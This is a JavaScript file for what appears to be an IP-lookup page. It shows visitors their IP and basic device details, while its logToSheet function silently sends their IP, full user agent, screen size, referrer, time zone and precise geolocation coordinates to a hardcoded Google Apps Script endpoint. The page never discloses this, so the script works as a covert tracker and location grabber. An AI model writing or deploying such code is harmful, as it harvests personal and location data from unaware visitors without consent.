document.addEventListener("DOMContentLoaded", function () {
    const loader = document.getElementById('loader');
    const ipDiv = document.getElementById('ip');
    const deviceInfoDiv = document.getElementById('device-info');

    // Fetch the IP address
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            ipDiv.textContent = data.ip;
            loader.classList.add('hidden'); // Hide loader
            ipDiv.classList.remove('hidden'); // Show IP

            // Get and display simplified device information
            const deviceInfo = getDeviceInfo(navigator.userAgent);
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const language = navigator.language || navigator.userLanguage;
            const referrer = document.referrer || 'Direct Access';
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown'; // Network Type
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Time Zone

            deviceInfoDiv.innerHTML = `
                Device: ${deviceInfo.device}<br>
                OS: ${deviceInfo.os}<br>
                Browser: ${deviceInfo.browser}<br>`;
            deviceInfoDiv.classList.remove('hidden'); // Show device info

            // Get and display the user's location
            getLocation(location => {
                if (location.latitude && location.longitude) {
                    // Reverse geocode to get city and area name
                    reverseGeocode(location.latitude, location.longitude);
                } else {
                    // Log all data if location access is denied
                    logToSheet({ latitude: null, longitude: null, city: 'Location access denied', area: 'Location access denied' });
                }
            });
        })
        .catch(error => {
            console.error('Error fetching IP address:', error);
            loader.classList.add('hidden'); // Hide loader
            ipDiv.textContent = 'Unable to retrieve IP address.';
            ipDiv.classList.remove('hidden'); // Show error message
        });
});

function getDeviceInfo(userAgent) {
    let device = "Unknown Device";
    let os = "Unknown OS";
    let browser = "Unknown Browser";

    // Determine the operating system
    if (/win/i.test(userAgent)) os = "Windows";
    else if (/mac/i.test(userAgent)) os = "MacOS";
    else if (/linux/i.test(userAgent)) os = "Linux";
    else if (/android/i.test(userAgent)) os = "Android";
    else if (/ios|iphone|ipad|ipod/i.test(userAgent)) os = "iOS";

    // Determine the browser
    if (/chrome|crios/i.test(userAgent)) {
        browser = "Chrome";
    } else if (/firefox|fxios/i.test(userAgent)) {
        browser = "Firefox";
    } else if (/safari/i.test(userAgent) && !/chrome|crios/i.test(userAgent)) {
        browser = "Safari";
    } else if (/edge/i.test(userAgent)) {
        browser = "Edge";
    } else if (/opr|opera/i.test(userAgent)) {
        browser = "Opera";
    }

    // Determine device type (basic detection)
    if (/mobile/i.test(userAgent)) {
        device = "Mobile Device";
    } else if (/tablet/i.test(userAgent)) {
        device = "Tablet";
    } else {
        device = "Desktop";
    }

    return { device, os, browser };
}

function getLocation(callback) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                const { latitude, longitude } = position.coords;
                callback({ latitude, longitude }); // Call callback with coordinates
            },
            error => {
                console.error("Error retrieving location:", error);
                callback({ latitude: null, longitude: null }); // Return null values on error
            }
        );
    } else {
        console.error("Geolocation is not supported by this browser.");
        callback({ latitude: null, longitude: null }); // Return null values if geolocation is not supported
    }
}

function reverseGeocode(latitude, longitude) {
    const url = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            const { address } = data;
            const city = address.city || address.town || address.village || "Unknown City";
            const area = address.state || address.region || "Unknown Area";

            // Log coordinates, city, and area for the sheet
            logToSheet({ latitude, longitude, city, area });
        })
        .catch(error => {
            console.error("Error fetching location details:", error);
            // Log data with denied location details
            logToSheet({ latitude: null, longitude: null, city: 'Location access denied', area: 'Location access denied' });
        });
}

function logToSheet(location) {
    const ipText = document.getElementById('ip').innerText; // Get IP text from the div
    const deviceInfo = getDeviceInfo(navigator.userAgent); // Get device information
    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const language = navigator.language || navigator.userLanguage;
    const referrer = document.referrer || 'Direct Access';
    const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown'; // Network Type
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Time Zone

    const appScriptUrl = 'https://script.google.com/macros/s/AKfycbxiQew-7jyHPMO8f0jzVmIgaUKGa6Ie8cS0EDfT4DsMyWXdoQgtbB9gWn5morvwMoUGvg/exec';

    console.log('Data to be sent:', {
        text: ipText,
        device: deviceInfo.device,
        os: deviceInfo.os,
        browser: deviceInfo.browser,
        userAgent: navigator.userAgent,
        screenResolution: screenResolution,
        language: language,
        referrer: referrer,
        networkType: networkType,
        timeZone: timeZone,
        location: {
            latitude: location.latitude || 'Location access denied',
            longitude: location.longitude || 'Location access denied',
            city: location.city || 'City access denied',
            area: location.area || 'Area access denied'
        }
    }); // Debugging line

    fetch(appScriptUrl, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            text: ipText,
            device: deviceInfo.device,
            os: deviceInfo.os,
            browser: deviceInfo.browser,
            userAgent: navigator.userAgent,
            screenResolution: screenResolution,
            language: language,
            referrer: referrer,
            networkType: networkType,
            timeZone: timeZone,
            location: {
                latitude: location.latitude || 'Location access denied',
                longitude: location.longitude || 'Location access denied',
                city: location.city || 'City access denied',
                area: location.area || 'Area access denied'
            }
        }),
    })
        .then(response => {
            console.log('Response:', response);
            return response.json(); // Parse the JSON response
        })
        .then(data => console.log('Success:', data))
        .catch(error => console.error('Error:', error));
}
